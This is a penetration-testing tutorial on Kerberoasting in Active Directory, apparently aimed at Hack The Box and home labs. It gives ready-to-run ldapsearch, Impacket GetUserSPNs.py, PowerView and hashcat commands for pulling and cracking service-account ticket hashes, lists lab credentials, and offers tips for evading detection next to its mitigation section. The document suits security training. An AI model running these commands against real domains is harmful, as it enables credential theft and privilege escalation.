# Kerberoasting Attack

## Overview

Kerberoasting is an attack technique in Active Directory environments that allows attackers to extract service account credentials by requesting Kerberos service tickets (TGS) for accounts associated with Service Principal Names (SPNs).

The extracted tickets are encrypted using the service account's password hash and can be cracked offline.

---

## Objectives

- Enumerate SPNs linked to domain accounts  
- Request Kerberos service tickets (TGS)  
- Extract ticket hashes  
- Crack hashes offline using tools like hashcat  

---

## Target Machines

- Active (Hack The Box)  
- Tentacle (Hack The Box)  

---

# 1. Enumerate SPNs Using LDAP

Use ldapsearch to query Active Directory and extract SPNs.

    ldapsearch -x -H ldap://192.168.1.50 \
    -D "" -w "" \
    -b "DC=armourinfosec,DC=local" > ldapsearch-output.txt

### Extract servicePrincipalName

    grep servicePrincipalName ldapsearch-output.txt | cut -d " " -f2 > spn-list.txt

### Extract userPrincipalName

    grep userPrincipalName ldapsearch-output.txt | cut -d " " -f2 > upn-list.txt

---

# 2. Create a Roastable User (Lab Setup)

Simulate a vulnerable service account by assigning an SPN.

    $PASSWORD = ConvertTo-SecureString -AsPlainText -Force -String "Password123"

    New-ADUser -Name "Kerbe-roast" `
    -Description "Kerberoasting Lab" `
    -Enabled $true `
    -AccountPassword $PASSWORD

    Set-ADUser -Identity Kerbe-roast `
    -ServicePrincipalNames @{Add="HTTP/dc.armourinfosec.local"}

---

# 3. Kerberoasting with Impacket

Use GetUserSPNs.py to request service tickets.

    GetUserSPNs.py 'armourinfosec.local/username:password' -dc-ip 192.168.2.100 -request

### Example (HTB Lab)

    GetUserSPNs.py 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' \
    -dc-ip 10.10.10.100 -request

Successful execution returns TGS hashes in hashcat format.

# 4. Kerberoasting with PowerView

If you have access to a domain-joined system:

    Import-Module .\PowerView.ps1
    Get-DomainUser -SPN *

### Dump Hashes

    Invoke-Kerberoast -OutputFormat Hashcat

# 5. Cracking Kerberos TGS Hashes

### Example Hash

    $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$... (truncated)

### Save Hashes

Store extracted hashes in:

    kerberoast-hashes.txt

### Crack Using Hashcat (TGS)

    hashcat -m 13100 -a 0 kerberoast-hashes.txt /opt/rockyou.txt

### Crack AS-REP Hashes (if applicable)

    hashcat -m 18200 -a 0 AS-REP-hash.txt /opt/rockyou.txt

### Monitor Progress

    watch -n 2 "hashcat -m 13100 --show kerberoast-hashes.txt"

# 7. Detection and Mitigation

## Defensive Measures

- Disable unused service accounts  
- Enforce strong, complex passwords  
- Rotate service account credentials regularly  
- Prefer AES encryption over RC4  
- Restrict interactive logon for service accounts  
- Monitor abnormal TGS request volumes  

## Detection Indicators

- High volume of TGS requests from a single host  
- Requests for multiple SPNs in a short timeframe  
- Use of legacy encryption (RC4)  

---

## Key Notes

- Kerberoasting does not require elevated privileges  
- Any authenticated domain user can request TGS tickets

# Impacket - GetUserSPNs

## Overview

GetUserSPNs.py is a script from the Impacket toolkit used to enumerate Service Principal Names (SPNs) in an Active Directory environment.

It is widely used in Kerberoasting attacks to request Kerberos service tickets (TGS) and extract hashes for offline cracking.

---

## Features

- Enumerates SPNs associated with domain accounts  
- Requests Kerberos TGS tickets  
- Extracts crackable hashes (Kerberoasting)  
- Supports anonymous and authenticated enumeration  

---

## Installation

    git clone https://github.com/fortra/impacket.git
    cd impacket
    python3 -m pip install .

---

## Help Menu

    python3 GetUserSPNs.py -h

---

## Anonymous Enumeration

If the domain allows anonymous LDAP queries:

    python3 GetUserSPNs.py armourinfosec.local/ -dc-ip 192.168.1.50

---

## Authenticated Enumeration

Authenticate with valid domain credentials:

    python3 GetUserSPNs.py armourinfosec.local/administrator:armour123 \
    -dc-ip 192.168.1.50

---

## Using a Custom User List

    python3 GetUserSPNs.py armourinfosec.local/administrator:armour123 \
    -dc-ip 192.168.1.50 \
    -usersfile username.txt

---

## Requesting TGS Tickets (Kerberoasting)

Use the -request flag to obtain Kerberos service tickets:

    GetUserSPNs.py infosecwarrior.local/ -dc-ip 192.168.2.100 -request

### With Credentials

    python3 GetUserSPNs.py infosecwarrior.local/administrator:armour123 \
    -dc-ip 192.168.2.100 \
    -request

### User List + TGS Request

    python3 GetUserSPNs.py infosecwarrior.local/administrator:armour123 \
    -dc-ip 192.168.2.100 \
    -usersfile username.txt \
    -request

---

## Save Extracted Hashes

    python3 GetUserSPNs.py infosecwarrior.local/administrator:armour123 \
    -dc-ip 192.168.2.100 \
    -request \
    -outputfile kerberoasting-hash.txt

---

## View Saved Hashes

    cat kerberoasting-hash.txt

---

## Crack Hashes with Hashcat

Kerberos TGS hashes (etype 23) use mode 13100.

    hashcat -a 0 -m 13100 kerberoasting-hash.txt /opt/rockyou.txt

---

## Show Cracked Results

    hashcat -a 0 -m 13100 kerberoasting-hash.txt /opt/rockyou.txt --show

---

## SPN Format Examples

Common SPN formats include:

- HTTP/servername.domain.local  
- MSSQLSvc/servername:1433  
- CIFS/servername.domain.local  

---

## Final Key Notes

- Only accounts with SPNs are Kerberoastable  
- RC4_HMAC (etype 23) hashes are easiest to crack  
- Any authenticated domain user can request TGS tickets  
- Extracted hashes can be cracked offline without alerting the domain  

---

## Best Practices

- Use -dc-ip to avoid DNS resolution issues  
- Combine results with tools like BloodHound for privilege escalation  
- Avoid excessive requests to reduce detection risk  
- Perform testing only in authorized environments
